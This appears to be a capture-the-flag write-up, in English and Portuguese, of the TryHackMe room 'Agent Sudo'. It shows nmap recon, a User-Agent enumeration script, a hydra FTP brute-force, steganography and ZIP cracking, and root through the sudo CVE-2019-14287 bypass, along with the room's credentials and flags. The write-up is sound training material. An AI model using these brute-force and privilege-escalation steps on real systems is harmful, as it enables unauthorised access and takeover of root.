# Agent Sudo — TryHackMe Write-up

![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green)
![Platform](https://img.shields.io/badge/Platform-TryHackMe-blue)
![OS](https://img.shields.io/badge/OS-Linux-lightgrey)
![Status](https://img.shields.io/badge/Status-Completed-success)

---

## Machine Information

| Attribute          | Details       |
|--------------------|---------------|
| **Name**           | Agent Sudo    |
| **Platform**       | TryHackMe     |
| **Difficulty**     | Easy          |
| **OS**             | Linux (Ubuntu 18.04) |
| **Date Completed** | March 2026    |

---

## Attack Chain

```
RECON        →  nmap -sC -sV  →  FTP(21), SSH(22), HTTP(80)
USER-AGENT   →  exploit_ua.py (differential response)  →  Agent C = chris
FTP BRUTE    →  hydra -l chris -P rockyou.txt  →  crystal
STEGO PNG    →  binwalk -e cutie.png  →  8702.zip (encrypted)
ZIP CRACK    →  zip2john + john  →  alien
BASE64       →  echo QXJlYTUx | base64 -d  →  Area51
STEGO JPG    →  steghide extract cute-alien.jpg  →  hackerrules!
SSH          →  ssh james@<IP>  →  user.txt
PRIVESC      →  sudo -l → (ALL, !root) /bin/bash → CVE-2019-14287
ROOT         →  sudo -u#-1 /bin/bash  →  root.txt
```

---

## Enumeration

### Nmap

```bash
nmap -sC -sV -T4 <IP> -oN nmap_initial.txt
```

| Port   | Service | Version          | Note                    |
|--------|---------|------------------|-------------------------|
| 21/tcp | FTP     | vsftpd 3.0.3     | —                       |
| 22/tcp | SSH     | OpenSSH 7.6p1    | —                       |
| 80/tcp | HTTP    | Apache 2.4.29    | Title: "Annoucement"    |

Três serviços padrão, sem nada imediatamente crítico. O título da página HTTP — "Annoucement" — indica que há conteúdo relevante servido diretamente no index, o que direcionou a investigação para o servidor web antes de qualquer outra superfície.

### HTTP — User-Agent Enumeration

```bash
curl http://<IP>/index.php
```

A página retornou uma mensagem assinada por **Agent R** instruindo os agentes a usarem seus codenames como User-Agent para acessar o site. O mecanismo de redirecionamento era o cabeçalho HTTP `User-Agent` — um controle de acesso por obscuridade, trivialmente contornável.

Em vez de testar cada letra manualmente com `curl -H`, foi desenvolvido um script Python de **differential response analysis**: o servidor é consultado com cada letra do alfabeto como User-Agent, e qualquer resposta com tamanho diferente da resposta padrão indica que aquele agente foi reconhecido.

```python
# exploit_ua.py
import requests

url = "http://<IP>"
alfabeto = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"

# Baseline: tamanho da resposta padrão (User-Agent não reconhecido)
r_baseline = requests.get(url)
tamanho_baseline = len(r_baseline.text)

for letra in alfabeto:
    headers = {'User-Agent': letra}
    r = requests.get(url, headers=headers)

    # Desvio do baseline = servidor reagiu diferente = agente encontrado
    if len(r.text) != tamanho_baseline:
        print(f"[+] Agent found: {letra}")
        print(r.text.strip())
        break
```

**Result:** `Agent C = chris` — com mensagem explícita de que a senha era fraca.

> **Note:** Esta técnica não busca uma string específica na resposta — detecta qualquer comportamento diferente do padrão. O mesmo princípio é aplicado em blind SQL injection e fuzzing de parâmetros.

---

## Initial Access

### FTP Brute-force

Com o username `chris` confirmado e a senha descrita como fraca, o ataque de força bruta ao FTP era o próximo passo direto.

```bash
hydra -l chris -P /usr/share/wordlists/rockyou.txt <IP> ftp
# [21][ftp] login: chris  password: crystal
```

```bash
ftp chris@<IP>
# Password: crystal

ftp> ls
# To_agentJ.txt
# cute-alien.jpg
# cutie.png

ftp> get To_agentJ.txt
ftp> get cute-alien.jpg
ftp> get cutie.png
```

O arquivo `To_agentJ.txt` continha a instrução central: a senha de login estava escondida dentro de uma das imagens. Com duas imagens disponíveis e a palavra "fake picture" no texto, ambas precisavam ser investigadas com técnicas de esteganografia.

### Steganography — PNG (binwalk)

O `binwalk` varre o arquivo em busca de magic bytes de formatos conhecidos em qualquer offset — detecta arquivos embutidos via append, que é diferente de esteganografia LSB.

```bash
binwalk -e cutie.png --run-as=root
```

**Output:**
```
0x8702   Zip archive data, encrypted, name: To_agentR.txt
```

Um ZIP criptografado estava embutido no PNG. O `unzip` nativo falhou por incompatibilidade de versão — o `7z` resolveu.

```bash
# Extrair hash do ZIP para o John
zip2john 8702.zip > zip_hash.txt
john zip_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
# alien

# Extrair conteúdo com 7z
7z x 8702.zip
# Password: alien

cat To_agentR.txt
# "We need to send the picture to 'QXJlYTUx' as soon as possible!"
```

`QXJlYTUx` é Base64. Decodificando:

```bash
echo "QXJlYTUx" | base64 -d
# Area51
```

### Steganography — JPG (steghide)

O `binwalk` não detectou nada no JPG porque o payload estava escondido via LSB (Least Significant Bit), não por append. Para esse método, a ferramenta adequada é o `steghide`.

```bash
steghide extract -sf cute-alien.jpg
# Passphrase: Area51

cat message.txt
# SSH password: hackerrules!
```

### SSH Access

```bash
ssh james@<IP>
# Password: hackerrules!
```

---

## Post-Exploitation

```bash
ls ~/
# Alien_autospy.jpg
# user_flag.txt

cat user_flag.txt
# b03d975e8c92a7c04146cfa7a5a313c7
```

A imagem `Alien_autospy.jpg` foi identificada via busca reversa (Google Images) como referência ao caso **Roswell alien autopsy** — evento de 1947 no Novo México que gerou controvérsia sobre supostos restos alienígenas.

---

## Privilege Escalation

### sudo -l Enumeration

```bash
sudo -l
# (ALL, !root) /bin/bash
```

A regra permite que `james` execute `/bin/bash` como qualquer usuário — exceto root. A restrição `!root` é implementada verificando o **nome** do usuário alvo, não o UID numérico.

### CVE-2019-14287 — sudo Integer Wrap-around

Em versões do sudo anteriores à 1.8.28, ao passar `#-1` como UID, ocorre um wrap-around aritmético: `-1` em um tipo `unsigned int` de 32 bits é interpretado como `4294967295`, que o kernel mapeia para `UID 0`. A verificação da regra `!root` e a chamada `setresuid()` acontecem em momentos diferentes e não se sincronizam — o bypass funciona porque os dois sistemas de validação não se comunicam.

```
-1 (int com sinal)
→ convertido para uint32
→ 4294967295
→ 4294967295 mod 2³² = 0
→ UID 0 = root
```

```bash
sudo -u#-1 /bin/bash

whoami
# root

cat /root/root.txt
# b53a02f55b57d4439e3341834d70c062
```

---

## Flags

| File           | Path          | Flag                                     |
|----------------|---------------|------------------------------------------|
| `user_flag.txt`| `/home/james/`| `b03d975e8c92a7c04146cfa7a5a313c7`       |
| `root.txt`     | `/root/`      | `b53a02f55b57d4439e3341834d70c062`       |

---

## Lições Aprendidas

Esta room demonstra que segurança por obscuridade — como o controle de acesso via User-Agent — não oferece proteção real. O mecanismo foi contornado com oito linhas de Python, sem nenhum exploit.

A cadeia de esteganografia (PNG com ZIP embutido → senha em Base64 → JPG com payload LSB) ilustra um conceito importante: dois métodos distintos de ocultação de dados que exigem ferramentas diferentes. O `binwalk` detecta append de arquivos via magic bytes; o `steghide` trabalha com substituição de bits em pixels. Confundir os dois levaria à conclusão errada de que a imagem não contém nada.

O CVE-2019-14287 é um lembrete de que regras de sudo aparentemente seguras podem ter bypass documentado. A configuração `(ALL, !root)` parece restritiva — e é, para versões atualizadas. Em versões antigas, a discrepância entre validação por nome e execução por UID cria a janela de exploração.

```bash
# Verificar versão do sudo antes de tentar o bypass
sudo --version
# Versões < 1.8.28 são vulneráveis ao CVE-2019-14287
```

---

## Tools Used

| Tool        | Purpose                                |
|-------------|----------------------------------------|
| `nmap`      | Port scanning and service detection    |
| `Python/requests` | Custom User-Agent enumeration    |
| `hydra`     | FTP brute-force                        |
| `binwalk`   | Embedded file extraction (PNG)         |
| `zip2john`  | ZIP hash extraction                    |
| `john`      | Hash cracking                          |
| `base64`    | Base64 decoding                        |
| `steghide`  | LSB steganography extraction (JPG)     |
| `ssh`       | Remote access                          |

---

## References

- [CVE-2019-14287 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2019-14287) — sudo privilege escalation via UID -1
- [GTFOBins](https://gtfobins.github.io) — SUID and sudo binary exploitation
- [CyberChef](https://gchq.github.io/CyberChef) — Base64 and encoding operations

---

*UmbraNull · [github.com/igorleite97](https://github.com/igorleite97) · offensive-writeups*
